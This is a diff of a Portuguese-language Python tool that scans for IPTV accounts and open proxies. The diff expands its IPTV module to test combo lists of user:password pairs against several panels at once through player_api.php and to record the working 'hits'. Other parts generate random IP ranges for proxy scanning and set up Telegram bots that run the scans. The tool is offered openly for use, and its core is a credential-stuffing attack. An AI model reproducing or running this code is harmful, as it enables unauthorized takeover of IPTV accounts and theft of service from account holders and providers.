@@ -11,19 +11,10 @@ import subprocess
 import zipfile
 from colorama import init, Fore, Style
 
-# Desativa avisos de conexões inseguras que poluem o terminal
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
-# Configurações da Ferramenta
 VERSION = "3.0 PRO"
-
-CHANGELOG = """
-- Letreiro Gigante (ASCII) atualizado para PROXY & IPTV SCANNER!
-- Novo Módulo: Scanner IPTV integrado no painel principal.
-- Gerenciador Automático para Bots de Telegram (Proxy e IPTV).
-- Mantido 100% das funções originais de Proxy e Cloudflare.
-"""
 
 UPDATE_URL = "https://raw.githubusercontent.com/DigitalAppsofc/Proxy_scan1/refs/heads/main/proxy_scanner.py" 
 UPDATE_AVAILABLE = False
@@ -37,31 +28,29 @@ def check_for_updates_silently():
         res = requests.get(UPDATE_URL, timeout=2)
         if f'VERSION = "{VERSION}"' not in res.text:
             UPDATE_AVAILABLE = True
-    except:
-        pass
+    except: pass
 
 def show_banner():
     clear_screen()
     banner = f"""{Fore.CYAN}{Style.BRIGHT}
-  ___  ____  ____  _  _    ____  ___   __   __ _  __ _  ____  ____ 
- (  _ \(  _ \(_  _)/ )( \  / ___)/ __) / _\ (  ( \(  ( \(  __)(  _ \\
-  )   / )   /  )(  \ \/ /  \___ \( (__ /    \/    //    / ) _)  )   /
- (_)\_)(__\_) (__)  \__/   (____/\___)\_/\_/\_)__)\_)__)(____)(__\_)
+  ___  ____  ____  _  _     ___   ___   __   _  _ 
+ (  _ \(_  _)(  _ \/ )( \   / __) / __) / _\ ( \( )
+  )___/ _)(_  )   /\ \/ /   \__ \( (__ /    \ )  ( 
+ (__)  (____)(_)\_) \__/    (___/ \___)\_/\_/(_)\_)
     
     {Fore.WHITE}Versão {VERSION} - By {Fore.GREEN}@Digital_Apps
-    {Fore.YELLOW}A Ferramenta Definitiva: IPTV & Proxies
+    {Fore.YELLOW}Ferramentas IPTV & Proxies
     """
     print(banner)
-    
     if UPDATE_AVAILABLE:
         print(f"    {Fore.GREEN}🟢 NOVA ATUALIZAÇÃO DISPONÍVEL! Vá no menu 6.{Style.RESET_ALL}\n")
 
 # ==========================================
-# 1. MÓDULO: SCANNER IPTV (TERMINAL)
+# 1. MÓDULO: SCANNER IPTV (MULTI-HOSTS)
 # ==========================================
 def test_iptv_account(server_url, username, password):
     try:
-        url = server_url.rstrip('/')
+        url = server_url.strip().rstrip('/')
         if not url.startswith('http'): url = 'http://' + url
         api_url = f"{url}/player_api.php?username={username}&password={password}"
         
@@ -77,12 +66,18 @@ def test_iptv_account(server_url, username, password):
             if auth == 1 or auth == "1" or status_conta in ['active', 'active!', 'trial', 'ativo', 'ativa', 'enabled']:
                 return True, user_info.get('status', 'Active')
         return False, "Failed"
-    except:
-        return False, "Error"
+    except: return False, "Error"
 
 def run_iptv_scanner():
     print(f"\n{Fore.CYAN}--- Módulo: Scanner IPTV ---")
-    server_url = input(f"{Fore.YELLOW}Digite a URL do painel (ex: http://site.com): {Fore.WHITE}").strip()
+    print(f"{Fore.WHITE}Você pode testar uma ou várias URLs ao mesmo tempo.")
+    server_urls_input = input(f"{Fore.YELLOW}Digite a(s) URL(s) separadas por vírgula:\n{Fore.WHITE}").strip()
+    
+    hosts = [h.strip() for h in server_urls_input.split(',')]
+    if not hosts or hosts == ['']:
+        print(f"{Fore.RED}[-] Nenhuma URL fornecida.")
+        input(f"\n{Fore.WHITE}Pressione ENTER para voltar...")
+        return
     
     print(f"\n{Fore.CYAN}Qual Combo (Lista) deseja usar?")
     print(f"{Fore.WHITE}[1] combo.txt (Padrão do Bot)")
@@ -92,7 +87,7 @@ def run_iptv_scanner():
     file_path = "combo.txt"
     
     if op == '2':
-        filename = input(f"Nome do arquivo {Fore.WHITE}(ex: vivos.txt){Fore.CYAN}: ").strip()
+        filename = input(f"Nome do arquivo {Fore.WHITE}(ex: lista.txt){Fore.CYAN}: ").strip()
         file_path = f"/sdcard/Download/{filename}" if os.path.exists('/data/data/com.termux') else filename
 
     if not os.path.exists(file_path):
@@ -107,30 +102,34 @@ def run_iptv_scanner():
         linhas = [l.strip() for l in f if ':' in l]
 
     if not linhas:
-        print(f"{Fore.RED}[-] Nenhuma conta válida (user:pass) encontrada no arquivo.")
+        print(f"{Fore.RED}[-] Nenhuma conta válida (user:pass) encontrada.")
         return
 
-    print(f"\n{Fore.YELLOW}[*] Iniciando teste de {len(linhas)} contas no painel {server_url}...")
+    # Monta a lista de testes cruzando todos os hosts com todas as contas
+    testes_totais = []
+    for host in hosts:
+        for linha in linhas:
+            usr, pwd = linha.split(':', 1)
+            testes_totais.append((host, usr, pwd))
+
+    print(f"\n{Fore.YELLOW}[*] Iniciando {len(testes_totais)} testes em {len(hosts)} painéis...")
     print(f"{Fore.RED}[!] Pressione CTRL+C a qualquer momento para parar.\n")
     
     hits = []
     concluidos = 0
-    total = len(linhas)
+    total = len(testes_totais)
     
     try:
         with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
-            futures = {}
-            for linha in linhas:
-                usr, pwd = linha.split(':', 1)
-                futures[executor.submit(test_iptv_account, server_url, usr, pwd)] = (usr, pwd)
-                
+            futures = {executor.submit(test_iptv_account, h, u, p): (h, u, p) for h, u, p in testes_totais}
             for future in concurrent.futures.as_completed(futures):
                 concluidos += 1
-                usr, pwd = futures[future]
+                h, u, p = futures[future]
                 try:
                     is_hit, status = future.result()
                     if is_hit:
-                        msg_hit = f"{usr}:{pwd} | Status: {status}"
+                        host_limpo = h.replace('http://', '').replace('https://', '').split('/')[0]
+                        msg_hit = f"[{host_limpo}] {u}:{p} | Status: {status}"
                         sys.stdout.write(f"\r\033[K{Fore.GREEN}[+] HIT: {msg_hit}\n")
                         hits.append(msg_hit)
                 except: pass
@@ -156,8 +155,6 @@ def run_iptv_scanner():
 # ==========================================
 def config_and_run_iptv_bot():
     print(f"\n{Fore.CYAN}--- Instalar e Ligar Bot IPTV ---")
-    
-    # 1. Extração do ZIP
     if not os.path.exists("main.py"):
         zip_name = "bot_scan_iptv.zip"
         if os.path.exists(zip_name):
@@ -171,12 +168,10 @@ def config_and_run_iptv_bot():
                 input(f"\n{Fore.WHITE}Pressione ENTER para voltar...")
                 return
         else:
-            print(f"{Fore.RED}[-] O arquivo main.py ou {zip_name} não foi encontrado!")
-            print(f"{Fore.WHITE}Certifique-se de que estão na mesma pasta.")
+            print(f"{Fore.RED}[-] O arquivo {zip_name} não foi encontrado!")
             input(f"\n{Fore.WHITE}Pressione ENTER para voltar...")
             return
 
-    # 2. Configuração do main.py
     print(f"\n{Fore.WHITE}Vamos configurar o seu Bot IPTV.")
     token = input(f"{Fore.YELLOW}Digite o Token do Bot do BotFather: {Fore.WHITE}").strip()
     admin_id = input(f"{Fore.YELLOW}Digite o seu ID do Telegram (Admin): {Fore.WHITE}").strip()
@@ -185,17 +180,13 @@ def config_and_run_iptv_bot():
         try:
             with open("main.py", "r", encoding="utf-8") as f:
                 conteudo = f.read()
-            
             conteudo = re.sub(r'API_TOKEN\s*=\s*["\'].*?["\']', f'API_TOKEN = "{token}"', conteudo)
             conteudo = re.sub(r'ADMIN_ID\s*=\s*["\'].*?["\']', f'ADMIN_ID = "{admin_id}"', conteudo)
-            
             with open("main.py", "w", encoding="utf-8") as f:
                 f.write(conteudo)
             print(f"{Fore.GREEN}[+] Credenciais salvas com sucesso no main.py!")
-        except Exception as e:
-            print(f"{Fore.RED}[-] Erro ao salvar credenciais: {e}")
+        except Exception as e: print(f"{Fore.RED}[-] Erro ao salvar credenciais: {e}")
 
-    # 3. Execução
     print(f"\n{Fore.YELLOW}[*] Iniciando o Bot IPTV...")
     time.sleep(1)
     print(f"{Fore.GREEN}[+] O BOT ESTÁ ON! Vá no Telegram e mande /admin no seu bot.")
@@ -217,8 +208,8 @@ def config_and_run_proxy_bot():
     
     if token:
         print(f"{Fore.GREEN}[+] Token salvo encontrado: {token[:10]}...")
-        op = input(f"{Fore.YELLOW}Deseja usar este token? (S/N): {Fore.WHITE}").strip().upper()
-        if op != 'S': token = ""
+        if input(f"{Fore.YELLOW}Deseja usar este token? (S/N): {Fore.WHITE}").strip().upper() != 'S':
+            token = ""
 
     if not token:
         token = input(f"{Fore.YELLOW}Digite o Token do Bot de Proxy: {Fore.WHITE}").strip()
@@ -233,9 +224,8 @@ def config_and_run_proxy_bot():
     except KeyboardInterrupt: print(f"\n{Fore.RED}[!] Bot Proxy desligado.")
     input(f"\n{Fore.WHITE}Pressione ENTER para voltar...")
 
-
 # ==========================================
-# 3. MÓDULOS ORIGINAIS DE PROXY (MANTIDOS INTACTOS)
+# 3. MÓDULOS ORIGINAIS DE PROXY
 # ==========================================
 def get_country(ip):
     try:
@@ -334,7 +324,7 @@ def run_cf_checker():
     filepath = f"/sdcard/Download/{filename_cf}" if os.path.exists('/data/data/com.termux') else filename_cf
         
     ok_count, concluidos, total = 0, 0, len(proxies_list)
-    print(f"\n{Fore.YELLOW}[*] Testando {total} proxies contra {url}...")
+    print(f"\n{Fore.YELLOW}[*] Testando {total} proxies...")
     
     def check_cloudflare_proxy(proxy_str, url, timeout_val):
         proxy_clean = proxy_str.split('|')[0].strip()
@@ -404,11 +394,8 @@ def main():
         
         choice = input(f"{Fore.YELLOW}Escolha uma opção: {Fore.WHITE}").strip()
         
-        if choice == '1':
-            run_iptv_scanner()
-            
+        if choice == '1': run_iptv_scanner()
         elif choice == '2':
-            # === CÓDIGO ORIGINAL DO PROXY SCANNER (INTACTO) ===
             print(f"\n{Fore.CYAN}--- Geração de IPs ---")
             base_input = input("Base do IP (ex: 12.50) ou R para aleatório: ").strip()
             if base_input.upper() == 'R':
@@ -460,22 +447,16 @@ def main():
                     for p in working_proxies: f.write(p + "\n")
                 print(f"\n{Fore.GREEN}[+] Salvo em: {filepath}")
             input(f"\n{Fore.WHITE}Pressione ENTER para voltar...")
-
-        elif choice == '3':
-            run_cf_checker()
-        elif choice == '4':
-            config_and_run_iptv_bot()
-        elif choice == '5':
-            config_and_run_proxy_bot()
-        elif choice == '6':
-            update_system()
+        elif choice == '3': run_cf_checker()
+        elif choice == '4': config_and_run_iptv_bot()
+        elif choice == '5': config_and_run_proxy_bot()
+        elif choice == '6': update_system()
         elif choice == '7':
             print(f"\n{Fore.RED}Saindo... Até logo!")
             sys.exit()
 
 if __name__ == "__main__":
-    try:
-        main()
+    try: main()
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}Script fechado pelo usuário.")
         sys.exit()
